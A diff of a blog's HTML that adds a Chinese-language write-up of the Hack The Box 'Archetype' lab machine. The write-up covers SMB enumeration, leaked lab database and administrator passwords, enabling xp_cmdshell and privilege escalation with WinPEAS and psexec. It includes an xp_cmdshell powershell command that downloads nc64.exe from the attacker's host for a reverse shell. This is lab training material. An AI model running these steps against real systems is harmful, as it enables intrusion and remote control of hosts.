@@ -9,7 +9,7 @@
     
     <title>
         
-            归档: 2020/4 |
+            Archetype靶机 |
         
         n3ym4r&#39;s blog
     </title>
@@ -77,7 +77,7 @@
                         </li>
                     
                         <li class="menu-item">
-                            <a class="active"
+                            <a class=""
                                href="/archives"
                             >
                                 归档
@@ -135,7 +135,7 @@
                 </li>
             
                 <li class="drawer-menu-item flex-center">
-                    <a class="active"
+                    <a class=""
                        href="/archives">归档</a>
                 </li>
             
@@ -170,93 +170,201 @@
 
                 
                     <div class="fade-in-down-animation">
-    <div class="archive-container ">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Archetype靶机</span>
+        </div>
+
         
-<div class="archive-list-container">
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">n3ym4r</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-02-03 14:22:00</span>
+        <span class="mobile">2023-02-03 14:22</span>
+    </span>
     
-        <section class="archive-item">
-            <div class="archive-item-header">
-                <span class="archive-year">2023</span>
-                <span class="archive-year-post-count">[4]</span>
-            </div>
-            <ul class="article-list">
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-02-03 14:21:16</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
                 
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2023/02/03/Archetype%E9%9D%B6%E6%9C%BA/"
-                        >Archetype靶机</a>
-                        <span class="article-date">02-03</span>
+                    <li>
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">打靶</a>&nbsp;
                     </li>
                 
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2023/02/02/Hack%20the%20box-Starting%20point%20TIER1%E9%80%9A%E5%85%B3/"
-                        >Hack the box-Starting point TIER1通关</a>
-                        <span class="article-date">02-02</span>
+                    <li>
+                        | <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
                     </li>
                 
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2023/02/01/Hack%20the%20box-Starting%20point%20TIER0%E9%80%9A%E5%85%B3/"
-                        >Hack the box-Starting point TIER0通关</a>
-                        <span class="article-date">02-01</span>
-                    </li>
-                
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2023/01/31/Ambassador%E9%9D%B6%E6%9C%BA/"
-                        >Ambassador靶机</a>
-                        <span class="article-date">01-31</span>
+                    <li>
+                        | <a href="/tags/HTB/">HTB</a>&nbsp;
                     </li>
                 
             </ul>
-        </section>
+        </span>
     
-        <section class="archive-item">
-            <div class="archive-item-header">
-                <span class="archive-year">2022</span>
-                <span class="archive-year-post-count">[1]</span>
-            </div>
-            <ul class="article-list">
-                
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2022/10/15/hello-world/"
-                        >Hello World</a>
-                        <span class="article-date">10-15</span>
-                    </li>
-                
-            </ul>
-        </section>
+
     
-        <section class="archive-item">
-            <div class="archive-item-header">
-                <span class="archive-year">2020</span>
-                <span class="archive-year-post-count">[2]</span>
-            </div>
-            <ul class="article-list">
-                
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2020/04/07/sql%E6%B3%A8%E5%85%A5/"
-                        >SQL注入学习笔记</a>
-                        <span class="article-date">04-07</span>
-                    </li>
-                
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2020/04/07/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"
-                        >XSS-labs通关笔记</a>
-                        <span class="article-date">04-07</span>
-                    </li>
-                
-            </ul>
-        </section>
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>755 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>2 分钟</span>
+        </span>
+    
     
 </div>
 
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>  整个流程很明了，扫出开放端口，smb远程连接，拿到数据库密码，利用mssqlclient建立连接，利用xp_cmdshell传nc，反弹shell拿到普通用户权限，利用WinPEAS提权，拿到最高权限密码，再通过psexec拿最高权限shell。整体思路很明确，需要注意的是与数据库连接后xp_cmdshell的开启，通过xp_cmdshell执行powershell命令的写法，通过xp_cmdshell传nc和winpeas时的目录是否有写入权限，反弹nc时端口的开启。这里问答题不一一写出了，答案过程中都有。</p>
+<span id="more"></span>
+
+<p>常规nmap扫描</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203093701635.png" alt="image-20230203093701635"></p>
+<p>可以看到139和445端口开了smb服务，1433端口开了数据库。</p>
+<p>用smbclient连接</p>
+<p><code>smbclient -L 10.129.251.225</code> 列出共享文件</p>
+<img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203095017636.png" alt="image-20230203095017636" style="zoom: 80%;" />
+
+<p>连接backups文件夹</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203095632714.png" alt="image-20230203095632714"></p>
+<p>将prod.dtsConfig文件get到本地查看，得到passwd:M3g4c0rp123，user id:ARCHETYPE\SqL_svc</p>
+<p>接下来利用impacket包下的mssqlclient.py与数据库建立连接</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203111715329.png" alt="image-20230203111715329"></p>
+<p>执行SELECT IS_SRVROLEMEMBER(‘sysadmin’) 查看权限，回显1，表示当前用户有sysadmin权限</p>
+<p>接着enable_xp_cmdshell; 获取xp_cmdshell</p>
+<p><code>xp_cmdshell 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 sql servevr 的原生工具</code></p>
+<p>也就是说把xp_cmdshell开启后，可以在sql中执行系统命令。</p>
+<p>本地监听80端口</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203112527428.png" alt="image-20230203112527428"></p>
+<p>访问可以看到我们本机的文件</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203112601959.png" alt="image-20230203112601959"></p>
+<p>也就是说，我们可以将payload放在本机中，然后通过xp_cmdshell来访问我们本机文件来下载到目标服务器</p>
+<p>然后本地nc监听，目标服务器使用nc连接获取shell</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203114202164.png" alt="image-20230203114202164"></p>
+<p>通过wget下载，发现没有权限</p>
+<p>换个有执行写入权限的目录</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203114914029.png" alt="image-20230203114914029"></p>
+<p><code>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.10/nc64.exe -outfile nc64.exe&quot;</code></p>
+<p>切换到downloads目录，通过wget获取到本机nc64.exe下载到目录下</p>
+<p><code>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;dir&quot;</code></p>
+<p>dir查看文件是否下载成功</p>
+<p>开启nc监听4443端口</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203115240746.png" alt="image-20230203115240746"></p>
+<p>主机执行以下命令，开启nc</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203122631401.png" alt="image-20230203122631401"></p>
+<p>反弹成功</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203122730858.png" alt="image-20230203122730858"></p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203123648716.png" alt="image-20230203123648716"></p>
+<p>拿到user下的flag</p>
+<p>接下来，提权到root用户</p>
+<p>使用到WinPEAS工具，这个 WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能方法，进行扫描</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203125218952.png" alt="image-20230203125218952"></p>
+<p>在主机上执行</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203125615881.png" alt="image-20230203125615881"></p>
+<p>在第一个文件中查看到了administrator的密码MEGACORP_4dm1n!!，这个ConsoleHost_history.txt是powershell的历史文件，相当于 Linux 系统的.bash_history</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203125531424.png" alt="image-20230203125531424"></p>
+<p>接下来使用impacket包下的psexec.py进行连接登录</p>
+<pre><code>PsExec 是一个轻型的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。PsExec 最强大的功能之一是在远程系统和远程支持工具（如 IpConfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。
+</code></pre>
+<p>最后连接这里，一直连接出错，就重启了台机器。</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203140247659.png" alt="image-20230203140247659"></p>
+<p>得到root权限下的flag</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203140457559.png" alt="image-20230203140457559"></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li>本文标题：Archetype靶机</li>
+        <li>本文作者：n3ym4r</li>
+        <li>创建时间：2023-02-03 14:22:00</li>
+        <li>
+            本文链接：https://n3ym4r.github.io/2023/02/03/Archetype靶机/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">#打靶</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/HTB/">#HTB</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/02/02/Hack%20the%20box-Starting%20point%20TIER1%E9%80%9A%E5%85%B3/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Hack the box-Starting point TIER1通关</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
     </div>
 </div>
+
 
                 
             </div>
@@ -292,6 +400,23 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-bottom-side-tools">
@@ -338,6 +463,14 @@
 
     </div>
 
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        
+    </div>
+</div>
+        </aside>
     
 
     <div class="zoom-in-image-mask">
@@ -395,6 +528,8 @@
 
 
 <div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/toc.js"></script>
     
 </div>
 
